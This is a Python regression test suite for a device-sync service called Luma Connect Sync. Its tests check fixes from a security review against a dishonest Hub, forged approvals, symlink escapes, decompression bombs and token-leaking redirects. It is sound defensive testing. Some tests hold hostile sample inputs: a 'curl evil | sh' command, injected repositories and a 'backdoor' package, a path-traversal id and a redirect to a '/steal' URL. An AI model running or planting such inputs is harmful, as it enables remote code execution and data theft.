# SPDX-License-Identifier: Apache-2.0
"""One regression test (or more) per finding of the Phase 1 security review
(handoffs/connect-sync-20261122/SECURITY-REVIEW.md). Each class names its
finding. Most run against the fake Hub; with ``hub.verify = False`` it plays
a Hub that accepts anything, to show the devices refuse it on their own."""
from __future__ import annotations

import http.server
import json
import math
import os
import stat
import subprocess
import sys
import tempfile
import threading
import time
import types
import unittest
import uuid
import zlib
from pathlib import Path

from harness import OWNER, enrol_fake, make_device, tree
from test_sync import Base

from luma_connect_sync import appdata, apps, crypto, keystore
from luma_connect_sync.account import SyncStateError
from luma_connect_sync.crypto import b64, unb64
from luma_connect_sync.hub import Hub, HubError, Registration

SOURCE = Path(__file__).resolve().parent.parent


class Members(Base):
    """Three devices with Sync on: a set it up and holds the words, b joined by code."""

    def setUp(self) -> None:
        super().setUp()
        self.need_fake()
        self.a, self.b = self.device("Desktop"), self.device("Laptop")
        self.pending = self.a.account.begin_setup()
        self.a.account.setup(self.pending.entropy)
        self.joined(self.a, self.b)

    @property
    def hub(self) -> dict:
        return self.fake.accounts[self.account]


class C1GrindingHub(Members):
    """C1: the Hub can't grind its own keys into the six-digit code."""

    def test_a_hub_that_grinds_its_own_keys_into_the_code_is_refused(self) -> None:
        d = self.device("ThinkPad")
        d.account.request_join()
        self.a.account.join_requests()                     # the approvers' half, fixed before the reveal
        code = d.account.join_view().code
        join = next(iter(self.hub["joins"].values()))
        n_a, commitment = unb64(join["approver_nonce"]), unb64(join["commitment"])
        # The Hub swaps in its own keys and grinds a device half that gives the same six digits.
        evil = crypto.DeviceKeys.generate()
        for attempt in range(20_000_000):
            n_m = attempt.to_bytes(32, "big")
            if crypto.join_code(self.account, join["id"], d.hub.device, evil.sign_pub, evil.box_pub, commitment, n_a, n_m) == code:
                break
        else:
            self.fail("no match ground")
        self.fake.rewrite_join = lambda asking, row: {**row, "sign_pub": b64(evil.sign_pub), "box_pub": b64(evil.box_pub),
                                                      "device_nonce": b64(n_m)} if asking == self.a.hub.device else row
        card = next(c for c in self.a.account.join_requests() if c["id"] == join["id"])
        self.assertTrue(card["tampered"], "the ground half doesn't open the commitment")
        self.assertEqual(card["code"], "", "no code is shown for it")
        with self.assertRaises(SyncStateError):
            self.a.account.approve(join["id"], code)
        self.assertNotIn(d.hub.device, self.hub["envelopes"], "nothing was wrapped to the Hub's keys")

    def test_the_joining_device_keeps_the_first_approver_half(self) -> None:
        d = self.device("ThinkPad")
        d.account.request_join()
        self.a.account.join_requests()
        self.assertEqual(d.account.join_view().state, "code")
        self.fake.rewrite_join = lambda asking, row: {**row, "approver_nonce": b64(os.urandom(32))} if asking == d.hub.device else row
        self.assertEqual(d.account.join_view().state, "tampered", "a changed approvers' half ends the join")
        self.fake.rewrite_join = None
        self.assertEqual(d.account.join_view().state, "tampered", "and it stays ended")

    def test_the_code_covers_join_id_and_commitment(self) -> None:
        args = ["acct", "join-1", "dev", b"s" * 32, b"b" * 32, b"c" * 32, b"a" * 32, b"d" * 32]
        base = crypto.join_code(*args)
        self.assertNotEqual(base, crypto.join_code("acct", "join-2", *args[2:]))
        self.assertNotEqual(base, crypto.join_code(*args[:5], b"C" * 32, *args[6:]))


class C2TokenAlone(Members):
    """C2: a device token alone never makes a member, a new epoch or a deletion."""

    def test_the_hub_refuses_self_promotion(self) -> None:
        m = self.device("Attacker")
        m.account.register()
        keys = m.account.keys()
        bundle = crypto.Bundle.first(self.account, crypto.recovery_keys(crypto.new_recovery_entropy(), self.account), m.hub.device, keys)
        sealed = crypto.wrap(bundle, m.hub.device, keys.box_pub)
        cert = os.urandom(32)
        statement = crypto.add_statement(self.account, 1, m.hub.device, keys.sign_pub, keys.box_pub, "recovery", "recovery", sealed, cert)
        with self.assertRaises(HubError) as refused:
            m.hub.post("keys/envelope", {"device": m.hub.device, "epoch": 1, "ciphertext": b64(sealed), "cert": b64(cert),
                                         "signature": b64(keys.sign.sign(crypto.envelope_message(self.account, m.hub.device, 1, sealed))),
                                         "statement": b64(crypto.canonical(statement)),
                                         "statement_signature": b64(keys.sign.sign(crypto.statement_bytes(statement)))})
        self.assertEqual(refused.exception.code, "recovery_proof")
        with self.assertRaises(HubError):
            m.hub.post("keys/epoch", {"epoch": 2, "envelopes": [], "recovery": b64(os.urandom(99))})
        with self.assertRaises(HubError):
            self.b.hub.post("keys/epoch", {"epoch": 2, "envelopes": [], "recovery": b64(os.urandom(99))})
        with self.assertRaises(HubError) as deleting:
            self.b.hub.call("DELETE", "account", {"at": int(time.time()), "proof": b64(os.urandom(64))})
        self.assertEqual(deleting.exception.code, "recovery_proof")
        self.assertIn(self.account, self.fake.accounts)

    def test_devices_ignore_a_member_the_hub_made_up(self) -> None:
        self.fake.verify = False
        m = self.device("Attacker")
        m.account.register()
        keys = m.account.keys()
        sealed, cert = os.urandom(200), os.urandom(32)
        statement = crypto.add_statement(self.account, 1, m.hub.device, keys.sign_pub, keys.box_pub, "recovery", "recovery", sealed, cert)
        m.hub.post("keys/envelope", {"device": m.hub.device, "epoch": 1, "ciphertext": b64(sealed), "cert": b64(cert), "signature": b64(os.urandom(64)),
                                     "statement": b64(crypto.canonical(statement)), "statement_signature": b64(os.urandom(64))})
        self.assertEqual(self.hub["devices"][m.hub.device]["state"], "member", "the dishonest Hub lists it")
        self.assertNotIn(m.hub.device, self.a.account.members())
        self.assertIn(self.b.hub.device, self.a.account.members(), "the approved device is a member through its signed statement")
        epoch, _ = self.a.account.revoke(self.b.hub.device)
        self.assertEqual(epoch, 2)
        self.assertEqual(set(self.hub["envelopes"]), {self.a.hub.device}, "the new key goes to signed members only")

    def test_delete_everything_needs_the_words(self) -> None:
        with self.assertRaises(HubError):
            self.b.account.delete_everything(crypto.recovery_words(crypto.new_recovery_entropy()))
        self.b.account.delete_everything(self.pending.words)
        self.assertNotIn(self.account, self.fake.accounts)


class H1ForgedApproval(Members):
    """H1: a joining device accepts only an approval from a member that matches its code."""

    def forged(self, d, wrapper: str, signer: crypto.DeviceKeys) -> None:
        fake_keys = crypto.DeviceKeys.generate()
        bundle = crypto.Bundle.first(self.account, crypto.recovery_keys(crypto.new_recovery_entropy(), self.account), wrapper, fake_keys)
        keys = d.account.keys()
        sealed = crypto.wrap(bundle, d.hub.device, keys.box_pub)
        self.hub["envelopes"][d.hub.device] = {"epoch": 1, "wrapper": wrapper, "ciphertext": b64(sealed),
                                               "signature": b64(signer.sign.sign(crypto.envelope_message(self.account, d.hub.device, 1, sealed)))}
        self.hub["devices"][d.hub.device]["state"] = "member"

    def test_a_hub_made_account_key_is_refused(self) -> None:
        for wrapper in ("self", "member"):
            with self.subTest(wrapper=wrapper):
                d = self.device(f"ThinkPad-{wrapper}")
                d.account.request_join()
                self.a.account.join_requests()
                self.assertEqual(d.account.join_view().state, "code")
                d.account.confirm_join(True)          # even when the person (wrongly) says the codes matched
                self.forged(d, d.hub.device if wrapper == "self" else self.a.hub.device, d.account.keys())
                with self.assertRaises(SyncStateError) as refused:
                    d.account.join_view()
                self.assertEqual(refused.exception.code, "not_approved")
                self.assertIsNone(d.account.bundle())


class H2Revocation(Members):
    """H2: revocation holds even when the Hub lies about who is a member."""

    def test_the_removed_device_gets_no_new_key_even_if_the_hub_ignores_the_removal(self) -> None:
        self.fake.verify = False
        self.a.hub.revoke = lambda device: None         # the Hub never marks b revoked
        epoch, _ = self.a.account.revoke(self.b.hub.device)
        self.assertEqual(epoch, 2)
        self.assertNotIn(self.b.hub.device, self.a.account.bundle().members)
        self.assertIn(crypto.removal(self.b.hub.device, b64(self.b.account.keys().sign_pub)), self.a.account.bundle().removed)
        self.assertEqual(set(self.hub["envelopes"]), {self.a.hub.device})
        self.assertEqual(self.b.account.bundle().epoch, 1)

    def test_a_key_made_by_the_removed_device_is_refused(self) -> None:
        b = self.b.account.bundle()
        members = {**b.members}
        forged = b.successor(members, [], self.b.hub.device, self.b.account.keys(), [self.b.hub.device])
        sealed = crypto.wrap(forged, self.a.hub.device, self.a.account.keys().box_pub)
        # The Hub serves the removed device's epoch 2 to the device removing it.
        self.hub.update(epoch=2)
        self.hub["envelopes"][self.a.hub.device] = {"epoch": 2, "wrapper": self.b.hub.device, "ciphertext": b64(sealed),
                                                    "signature": b64(self.b.account.keys().sign.sign(
                                                        crypto.envelope_message(self.account, self.a.hub.device, 2, sealed)))}
        with self.assertRaises(SyncStateError):
            self.a.account.revoke(self.b.hub.device)
        self.assertEqual(self.a.account.bundle().epoch, 1, "the forged key was not taken")

    def test_bundle_rules(self) -> None:
        a = self.a.account.bundle()
        akeys = self.a.account.keys()
        outsider = crypto.DeviceKeys.generate()
        by_outsider = a.successor(a.members, [], "outsider", outsider, [])
        self.assertFalse(by_outsider.follows(a), "signed by a device that isn't a member")
        gone = crypto.removal(self.b.hub.device, b64(self.b.account.keys().sign_pub))
        honest = a.successor(a.members, [gone], self.a.hub.device, akeys, [self.a.hub.device])
        self.assertTrue(honest.follows(a, self.a.account.members(a)))
        back = honest.successor({**honest.members, self.b.hub.device: self.b.account.keys().entry()}, [], self.a.hub.device, akeys, [])
        self.assertNotIn(self.b.hub.device, back.members, "a removed device never comes back with its old keys")
        fresh = crypto.DeviceKeys.generate()
        again = honest.successor({**honest.members, self.b.hub.device: fresh.entry()}, [], self.a.hub.device, akeys, [])
        self.assertIn(self.b.hub.device, again.members, "with new keys (after a code-checked approval) it may")
        promoted = a.successor({**a.members, "new": outsider.entry()}, [], self.a.hub.device, akeys, [])
        self.assertFalse(promoted.follows(a), "members only from the previous epoch and signed additions")

    def test_new_writes_never_use_an_old_zone_key(self) -> None:
        self.a.engine.save("apps", "flatpak:org.example.One", {"kind": "flatpak", "id": "org.example.One"})
        zone = self.a.engine.zone_id("apps")
        self.a.account.revoke(self.b.hub.device)
        self.a.engine.save("apps", "flatpak:org.example.Two", {"kind": "flatpak", "id": "org.example.Two"})
        # The Hub now pretends the zone never got a new key.
        z = self.hub["zones"][zone]
        z["generation"] = 1
        z["keys"] = {1: z["keys"][1]}
        self.a.engine._zones.clear()
        with self.assertRaises(HubError) as stale:
            self.a.engine.save("apps", "flatpak:org.example.Three", {"kind": "flatpak", "id": "org.example.Three"})
        self.assertEqual(stale.exception.code, "stale_generation")


class H3Keystore(unittest.TestCase):
    """H3 (Connect Sync's part): its keys are sealed with systemd-creds --user, not left in the login keyring."""

    def test_sealed_files(self) -> None:
        root = Path(tempfile.mkdtemp())
        tool = root / "bin/systemd-creds"
        tool.parent.mkdir()
        log = root / "calls"
        tool.write_text("#!/bin/sh\n"
                        f"echo \"$@\" >> {log}\n"
                        "[ \"$1\" = --user ] || exit 9\n"
                        "case \"$2\" in encrypt) (printf 'SEALED:'; base64) > \"$5\";; decrypt) tail -c +8 \"$4\" | base64 -d;; esac\n")
        tool.chmod(0o755)
        old = os.environ["PATH"]
        os.environ["PATH"] = f"{tool.parent}:{old}"
        try:
            store = keystore.CredsKeystore(root / "keys")
            store.put("dev-1", "bundle", b"top secret")
            self.assertEqual(store.get("dev-1", "bundle"), b"top secret")
            path = root / "keys/dev-1.bundle.cred"
            self.assertNotIn(b"top secret", path.read_bytes())
            self.assertEqual(stat.S_IMODE(path.stat().st_mode), 0o600)
            self.assertEqual(stat.S_IMODE((root / "keys").stat().st_mode), 0o700)
            self.assertIn("--name=luma-sync-bundle", log.read_text())
            with self.assertRaises(keystore.KeystoreError):
                store.put("../x", "bundle", b"x")
        finally:
            os.environ["PATH"] = old

    def test_keys_sealed_to_a_reset_tpm(self) -> None:
        root = Path(tempfile.mkdtemp())
        tool = root / "bin/systemd-creds"
        tool.parent.mkdir()
        tool.write_text("#!/bin/sh\necho 'The TPM integrity check for this key failed, key probably belongs to another TPM.' >&2\nexit 1\n")
        tool.chmod(0o755)
        (root / "keys").mkdir()
        (root / "keys/dev-1.bundle.cred").write_bytes(b"sealed")
        old = os.environ["PATH"]
        os.environ["PATH"] = f"{tool.parent}:{old}"
        try:
            started = time.monotonic()
            with self.assertRaises(keystore.KeystoreError) as refused:
                keystore.CredsKeystore(root / "keys").get("dev-1", "bundle")
            self.assertLess(time.monotonic() - started, 5, "no retries for a key no retry can open")
            self.assertIn("join again", str(refused.exception))
        finally:
            os.environ["PATH"] = old

    def test_default_is_sealed_files(self) -> None:
        old = os.environ.pop("LUMA_CONNECT_SYNC_KEYSTORE", None)
        try:
            self.assertIsInstance(keystore.open_keystore(), keystore.CredsKeystore)
        finally:
            if old is not None:
                os.environ["LUMA_CONNECT_SYNC_KEYSTORE"] = old


class H4Owner(Members):
    """H4: an app is its id and its publisher; a same-id impostor gets nothing."""

    def test_an_impostor_gets_nothing(self) -> None:
        real = self.a.target("org.example.Kiln")
        impostor = appdata.Target(real.app, "flatpak", self.b.root / "home/.var/app" / real.app, real.app, owner="flatpak:someone-else")
        (real.folder / "data").mkdir(parents=True)
        (real.folder / "data/secret.txt").write_text("for the real app only")
        self.assertEqual(self.a.appdata.sync_app(real, quiet=True), "synced")
        self.assertNotEqual(real.zone, impostor.zone)
        self.b.appdata.sync_app(impostor, quiet=True)
        self.assertFalse((impostor.folder / "data/secret.txt").exists())
        head = self.a.engine.get(real.zone, "head")[1]
        self.b.engine.fetch(real.zone)
        with self.assertRaises(appdata.SnapshotAborted):
            self.b.appdata.remote_manifest(impostor, head)

    def test_fingerprints_from_a_real_keyring(self) -> None:
        import glob
        import shutil
        keys = sorted(glob.glob("/etc/pki/rpm-gpg/RPM-GPG-KEY-*")) + sorted(glob.glob("/usr/share/keyrings/*.gpg"))
        if not shutil.which("gpg") or not keys:
            self.skipTest("needs gpg and a public key on this machine")
        self.assertTrue(appdata._gpg_fingerprints(Path(keys[0])), "gpg must read the keyring without a home of its own")
        self.assertEqual(appdata._gpg_fingerprints(Path("/nonexistent/keyring.gpg")), [])

    def test_owner_is_the_remote_and_its_keys(self) -> None:
        installed = {"org.example.Kiln": {"remote": "flathub", "installation": "user"}}
        saved = apps.remotes, appdata._gpg_fingerprints
        try:
            apps.remotes = lambda: [{"name": "flathub", "installation": "user", "url": "https://dl.flathub.org/repo/"}]
            appdata._gpg_fingerprints = lambda path: ["AAAA"]
            first = appdata.flatpak_owner("org.example.Kiln", installed, "dev")
            apps.remotes = lambda: [{"name": "flathub", "installation": "user", "url": "https://evil.example/repo/"}]
            second = appdata.flatpak_owner("org.example.Kiln", installed, "dev")
            appdata._gpg_fingerprints = lambda path: []
            unsigned = appdata.flatpak_owner("org.example.Kiln", installed, "dev")
        finally:
            apps.remotes, appdata._gpg_fingerprints = saved
        self.assertTrue(first.startswith("flatpak:"))
        self.assertNotEqual(first, second)
        self.assertEqual(unsigned, "local:dev")
        self.assertFalse(appdata.Target("x.y.z", "flatpak", Path("/x"), owner=unsigned).syncs, "an unsigned source never syncs")
        self.assertEqual(appdata.store_owner({"tree": {"userland": "debian-13", "origin": {"added_repositories": [1]}}}, "dev"), "local:dev")


class H5StoreRecords(unittest.TestCase):
    """H5: a synced record never brings its own repositories, packages or commands."""

    def test_vendor_repository_records_are_not_installed(self) -> None:
        called = []
        saved = subprocess.run
        subprocess.run = lambda *a, **k: called.append(a)  # type: ignore[assignment]
        try:
            with self.assertRaises(apps.Unavailable):
                apps.install_store({"kind": "store", "id": "deb-x", "needs_vendor_repository": True, "vendor_hosts": ["repo.example"]})
        finally:
            subprocess.run = saved
        self.assertEqual(called, [])

    def test_rebuild_uses_only_named_fields(self) -> None:
        seen: dict = {}
        fake = types.ModuleType("luma_installer")
        closure = types.ModuleType("luma_installer.closure")
        closure.USERLANDS = {"debian-13": types.SimpleNamespace(family="deb")}
        closure.Spec = lambda **kw: seen.setdefault("spec", kw) or kw
        store_install = types.ModuleType("luma_installer.store_install")

        class Fallback(Exception):
            reason = "x"
        store_install.Fallback = Fallback

        def build_tree(store, app, kind, spec, record):
            seen["record"] = record
            raise Fallback()
        store_install.build_tree = build_tree
        capsule_identity = types.ModuleType("luma_installer.capsule_identity")
        capsule_identity.ensure_level = lambda record: dict(record)
        app_store = types.ModuleType("luma_installer.app_store")
        app_store.Store = lambda: None
        desktop = types.ModuleType("luma_installer.desktop")
        errors = types.ModuleType("luma_installer.errors")
        errors.InstallerError = Exception
        desktop.read_record = lambda app: {}
        launcher = types.ModuleType("luma_installer.closure_launcher")
        modules = {"luma_installer": fake, "luma_installer.closure": closure, "luma_installer.store_install": store_install,
                   "luma_installer.capsule_identity": capsule_identity, "luma_installer.app_store": app_store,
                   "luma_installer.desktop": desktop, "luma_installer.errors": errors, "luma_installer.closure_launcher": launcher}
        for name, module in modules.items():
            setattr(fake, name.rsplit(".", 1)[-1], module)
        hostile = {"id": "deb-org.example.Tool", "format": "deb", "package": "tool", "userland": "debian-13", "sha256": "0" * 64,
                   "tree": {"origin": {"added_repositories": [{"path": "evil.list", "content": "ZGViIGh0dHA6Ly9ldmlsLyBtYWlu"}]}},
                   "extra_packages": ["backdoor"], "command": ["sh", "-c", "curl evil | sh"], "repositories": ["http://evil/"]}
        saved_modules = {name: sys.modules.get(name) for name in modules}
        saved_stdin = sys.stdin
        sys.modules.update(modules)
        sys.stdin = __import__("io").StringIO(json.dumps(hostile))
        try:
            from luma_connect_sync import store_rebuild
            self.assertEqual(store_rebuild.main(), 3)
        finally:
            sys.stdin = saved_stdin
            for name, module in saved_modules.items():
                if module is None:
                    sys.modules.pop(name, None)
                else:
                    sys.modules[name] = module
        self.assertEqual(seen["spec"], {"app_id": "deb-org.example.Tool", "kind": "deb", "userland": "debian-13", "package": "tool",
                                        "from_repository": True})
        self.assertNotIn("backdoor", json.dumps(seen["record"]))
        self.assertNotIn("evil", json.dumps(seen["record"]))


class SignInsArrive(Members):
    """Proof finding: an app that made a fresh, empty keyring before the synced sign-ins arrived still gets them."""

    def test_publish_stores_what_this_keyring_lacks(self) -> None:
        from luma_connect_sync import portal_secrets as ps
        ta, tb = self.a.target("org.example.Kiln"), self.b.target("org.example.Kiln")
        keyrings = {self.a.hub.device: [{"label": "x", "attributes": {"account": "p"}, "content_type": "text/plain", "secret": "c2VjcmV0"}],
                    self.b.hub.device: []}
        stamps = {self.a.hub.device: [1, 1], self.b.hub.device: [0, 1]}
        current = {"device": self.a.hub.device}
        saved = (ps.read, ps.write, ps.uses_portal, ps._stamp)
        ps.read = lambda app: list(keyrings[current["device"]])
        ps.write = lambda app, items: keyrings[current["device"]].extend(items)
        ps.uses_portal = lambda app: True
        ps._stamp = lambda app: stamps[current["device"]]
        try:
            ps.publish(self.a.engine, self.a.local, ta)
            current["device"] = self.b.hub.device
            ps.publish(self.b.engine, self.b.local, tb)     # b's app made an empty keyring first
            ps.restore(self.b.engine, self.b.local, tb)
        finally:
            ps.read, ps.write, ps.uses_portal, ps._stamp = saved
        self.assertEqual(keyrings[self.b.hub.device], keyrings[self.a.hub.device])


class M1Pieces(Members):
    """M1: fixed 1 MiB blocks, Padmé padding of the whole file, shuffled uploads, piece ids keyed per key generation."""

    def test_blocks_padding_and_order(self) -> None:
        ta = self.a.target("org.example.Kiln")
        (ta.folder / "data").mkdir(parents=True)
        size = 8 * appdata.BLOCK + 12345
        (ta.folder / "data/big.bin").write_bytes(os.urandom(size))
        (ta.folder / "data/small.txt").write_text("x" * 3000)
        self.fake.put_order.clear()
        self.assertEqual(self.a.appdata.sync_app(ta, quiet=True), "synced")
        manifest = self.a.appdata.base_manifest(ta)
        entry = manifest["files"]["data/big.bin"]
        blocks = [p[0] for p in entry["p"]] + [p[0] for p in entry.get("pad") or []]
        self.assertGreaterEqual(len(blocks) * appdata.BLOCK, crypto.padme(size))
        self.assertTrue(all(p[3] <= appdata.BLOCK for p in entry["p"]))
        zone = self.hub["zones"][self.a.engine.zone_id(ta.zone)]
        overhead = 4 + 1 + 24 + 16 + 4
        sizes = {len(zone["blobs"][b]) - overhead for b in blocks}
        self.assertEqual(sizes, {appdata.BLOCK}, "every block of a large file is the same size")
        for blob, body in zone["blobs"].items():
            if blob not in blocks:
                plain = len(body) - overhead
                self.assertEqual(plain, crypto.padme(plain), "packs and manifests are Padmé sizes")
        order = [b for b in self.fake.put_order if b in set(entry_ids(entry))]
        self.assertNotEqual(order, entry_ids(entry), "blocks are uploaded in a shuffled order")

    def test_piece_ids_change_with_the_zone_key(self) -> None:
        self.a.engine.save("apps", "x", {"k": 1})
        zone = self.a.engine.zone_id("apps")
        before = self.a.engine.blob_id(zone, b"same bytes")
        self.assertEqual(before, self.a.engine.blob_id(zone, b"same bytes"))
        self.a.account.revoke(self.b.hub.device)
        self.a.engine.refresh_zones()
        self.assertNotEqual(before, self.a.engine.blob_id(zone, b"same bytes"), "a removed device can't confirm content by id")
        self.assertEqual(crypto.FORMAT, 2)


def entry_ids(entry: dict) -> list[str]:
    return [p[0] for p in entry["p"]]


class M2Deletions(Members):
    """M2: a deletion is a sealed tombstone; a Hub-made one is ignored."""

    def test_forged_deletion_is_ignored(self) -> None:
        self.a.engine.save("apps", "flatpak:org.example.One", {"id": "org.example.One"})
        self.b.engine.fetch("apps")
        zone = self.a.engine.zone_id("apps")
        with self.fake.lock:
            for record in self.hub["zones"][zone]["records"].values():
                record.update(deleted=True, ciphertext=None, version=record["version"] + 1, seq=self.fake.bump(self.hub))
        self.b.engine.fetch("apps")
        self.assertEqual(self.b.engine.get("apps", "flatpak:org.example.One")[1], {"id": "org.example.One"})

    def test_a_deletion_flag_on_a_live_record_is_ignored(self) -> None:
        self.a.engine.save("apps", "flatpak:org.example.One", {"id": "org.example.One"})
        zone = self.a.engine.zone_id("apps")
        for record in self.hub["zones"][zone]["records"].values():
            record.update(deleted=True)
        self.assertEqual(self.b.engine.fetch("apps"), [])

    def test_a_real_deletion_is_sealed_with_its_writer(self) -> None:
        self.a.engine.save("apps", "flatpak:org.example.One", {"id": "org.example.One"})
        self.a.engine.save("apps", "flatpak:org.example.One", None)
        self.assertIn(("flatpak:org.example.One", None, self.a.hub.device), self.b.engine.fetch("apps"))
        row = next(iter(self.hub["zones"][zone_of(self.a, "apps")]["records"].values()))
        self.assertTrue(row["ciphertext"], "the Hub stores the tombstone's ciphertext")


def zone_of(device, label: str) -> str:
    return device.engine.zone_id(label)


class M3Paths(Members):
    """M3: files are opened beneath the folder, never through a symlink."""

    def test_open_beneath_refuses_links(self) -> None:
        folder = self.root / "folder"
        (folder / "real").mkdir(parents=True)
        (folder / "real/file").write_text("ok")
        outside = self.root / "outside"
        outside.mkdir()
        (outside / "file").write_text("host secret")
        os.symlink(outside, folder / "link")
        root = appdata.open_folder(folder)
        try:
            os.close(appdata.open_beneath(root, "real/file"))
            with self.assertRaises(OSError):
                appdata.open_beneath(root, "link/file")
            os.symlink(outside / "file", folder / "real/swapped")
            with self.assertRaises(OSError):
                appdata.open_beneath(root, "real/swapped")
        finally:
            os.close(root)

    def test_a_linked_folder_is_neither_read_nor_written_through(self) -> None:
        ta, tb = self.a.target("org.example.Kiln"), self.b.target("org.example.Kiln")
        outside = self.root / "outside"
        outside.mkdir()
        (outside / "secret").write_text("host secret")
        (ta.folder / "data").mkdir(parents=True)
        (ta.folder / "data/ok.txt").write_text("ok")
        os.symlink(outside, ta.folder / "data/dir")
        self.a.appdata.sync_app(ta, quiet=True)
        tb.folder.mkdir(parents=True)
        os.symlink(outside, tb.folder / "data")
        self.b.appdata.sync_app(tb, quiet=True)
        self.assertEqual(sorted(p.name for p in outside.iterdir()), ["secret"], "nothing was written through the link")
        self.assertNotIn("data/dir/secret", tree(tb.folder))


class M4Callers(unittest.TestCase):
    """M4: management calls answer only the person's session, the shell and Settings; the name is never queued for."""

    def proc(self, cgroup: str) -> Path:
        root = Path(tempfile.mkdtemp())
        (root / "7").mkdir()
        (root / "7/cgroup").write_text(f"0::{cgroup}\n")
        return root

    def test_allow_list(self) -> None:
        from luma_connect_sync import service
        allowed = ["/user.slice/user-1000.slice/session-2.scope",
                   "/user.slice/user-1000.slice/user@1000.service/session.slice/org.gnome.Shell@wayland.service",
                   "/user.slice/user-1000.slice/user@1000.service/app.slice/app-gnome-org.gnome.Settings-4242.scope"]
        refused = ["/user.slice/user-1000.slice/user@1000.service/app.slice/app-flatpak-org.example.Evil-1.scope",
                   "/user.slice/user-1000.slice/user@1000.service/app.slice/app-luma-deb_x-9.scope",
                   "/user.slice/user-1000.slice/user@1000.service/app.slice/evil-session-1.scope.d"]
        for cgroup in allowed:
            self.assertTrue(service.trusted_caller(7, self.proc(cgroup)), cgroup)
        for cgroup in refused:
            self.assertFalse(service.trusted_caller(7, self.proc(cgroup)), cgroup)
        self.assertFalse(service.trusted_caller(8, self.proc(allowed[0])), "an unreadable caller is refused")
        self.assertIn("DO_NOT_QUEUE", (SOURCE / "luma_connect_sync/service.py").read_text())
        for method in ("ApproveJoin", "RemoveDevice", "JoinWithRecoveryKey", "RevealRecoveryKey", "DeleteAllSyncedData"):
            self.assertIn(method, service.TRUSTED_ONLY)


class M5PieceSize(Members):
    """M5: no piece is larger than the Hub accepts, whatever the content."""

    def test_incompressible_packs_upload(self) -> None:
        ta, tb = self.a.target("org.example.Kiln"), self.b.target("org.example.Kiln")
        (ta.folder / "data").mkdir(parents=True)
        for i in range(40):
            (ta.folder / f"data/f{i:02}.bin").write_bytes(os.urandom(250_000))
        self.assertEqual(self.a.appdata.sync_app(ta, quiet=True), "synced")
        zone = self.hub["zones"][self.a.engine.zone_id(ta.zone)]
        self.assertTrue(all(len(b) <= 4 * 1024 * 1024 for b in zone["blobs"].values()))
        self.assertEqual(self.b.appdata.sync_app(tb, quiet=True), "synced")
        self.assertEqual(tree(tb.folder), tree(ta.folder))


class M6RecoveryHolder(Members):
    """M6: removing the device that kept the words replaces the recovery key."""

    def test_new_words_when_the_holder_is_removed(self) -> None:
        epoch, words = self.b.account.revoke(self.a.hub.device)
        self.assertEqual(epoch, 2)
        self.assertEqual(len(words or []), 24)
        self.assertNotEqual(words, self.pending.words)
        fresh = self.device("ThinkPad")
        with self.assertRaises(SyncStateError):
            fresh.account.join_with_recovery(self.pending.words)
        fresh.account.join_with_recovery(words)
        self.assertEqual(fresh.account.refresh(), "member")
        self.assertIsNone(fresh.keystore.get(fresh.hub.device, "recovery"), "a device that joined with the words doesn't keep them")


class L2Bombs(Members):
    """L2: a record that inflates past the limit is ignored."""

    def test_decompression_bomb(self) -> None:
        self.a.engine.save("apps", "ok", {"v": 1})
        zone = self.a.engine.zone_id("apps")
        generation, key = self.a.engine.current(zone)
        bundle = self.a.account.bundle()
        name = crypto.record_name(bundle.names, zone, "bomb")
        plain = zlib.compress(crypto.canonical({"n": "bomb", "v": "0" * (6 * 1024 * 1024), "w": "x", "t": 1}), 9)
        sealed = crypto.seal(key, plain, crypto.record_ad(self.account, zone, name, generation, 1))
        self.a.hub.post(f"zones/{zone}/records", {"records": [{"name": name, "base": 0, "generation": generation, "ciphertext": b64(sealed)}]})
        self.b.engine.fetch("apps")
        self.assertEqual(self.b.engine.get("apps", "bomb"), (0, None))
        self.assertEqual(self.b.engine.get("apps", "ok")[1], {"v": 1})


class L3Redirects(unittest.TestCase):
    """L3: piece ids are checked, and the token never follows a redirect."""

    def test_no_redirects(self) -> None:
        hits = []

        class Other(http.server.BaseHTTPRequestHandler):
            def do_GET(self):  # noqa: N802
                hits.append(self.headers.get("Authorization"))
                self.send_response(200)
                self.end_headers()

            def log_message(self, *_a):
                pass

        other = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Other)
        threading.Thread(target=other.serve_forever, daemon=True).start()

        class Redirect(http.server.BaseHTTPRequestHandler):
            def do_GET(self):  # noqa: N802
                self.send_response(302)
                self.send_header("Location", f"http://127.0.0.1:{other.server_address[1]}/steal")
                self.end_headers()

            def log_message(self, *_a):
                pass

        server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Redirect)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            hub = Hub(Registration("dev", "secret-token", f"http://127.0.0.1:{server.server_address[1]}", "x"))
            with self.assertRaises(HubError):
                hub.get("account")
            self.assertEqual(hits, [])
        finally:
            server.shutdown()
            other.shutdown()

    def test_piece_ids_in_manifests(self) -> None:
        target = appdata.Target("org.example.App", "flatpak", Path("/x"), owner=OWNER)
        bad = {"v": 2, "app": target.app, "owner": OWNER, "files": {"f": {"t": "f", "s": 1, "h": "0" * 64, "p": [["../../../account", 1, 0, 1]]}}}
        with self.assertRaises(appdata.SnapshotAborted):
            appdata.check_manifest(target, bad)


class L4Format(unittest.TestCase):
    """L4: every sealed object starts with its format byte, bound into the AD; fields are length-prefixed."""

    def test_format_byte(self) -> None:
        key = os.urandom(32)
        sealed = crypto.seal(key, b"x", b"ad")
        self.assertEqual(sealed[0], crypto.FORMAT)
        with self.assertRaises(crypto.CryptoError):
            crypto.open_sealed(key, bytes([1]) + sealed[1:], b"ad")
        self.assertNotEqual(crypto.lp("ab", "c"), crypto.lp("a", "bc"))


class L5Dconf(unittest.TestCase):
    """L5: settings that run commands or hold accounts are never an app's own."""

    def test_reserved(self) -> None:
        for app in ("org.gnome.Terminal", "org.gnome.Ptyxis", "org.gnome.Crypto.Foo", "org.gnome.System.Foo"):
            self.assertEqual(appdata.allowed_dconf(app), set(), app)


class L8Signals(unittest.TestCase):
    """L8: the broadcast join signal carries no code."""

    def test_join_signal(self) -> None:
        import xml.etree.ElementTree as ET
        root = ET.parse(SOURCE / "data/org.projectluma.ConnectSync1.xml").getroot()
        signal = next(s for s in root.iter("signal") if s.get("name") == "JoinRequested")
        self.assertNotIn("code", [arg.get("name") for arg in signal.iter("arg")])


if __name__ == "__main__":
    unittest.main()
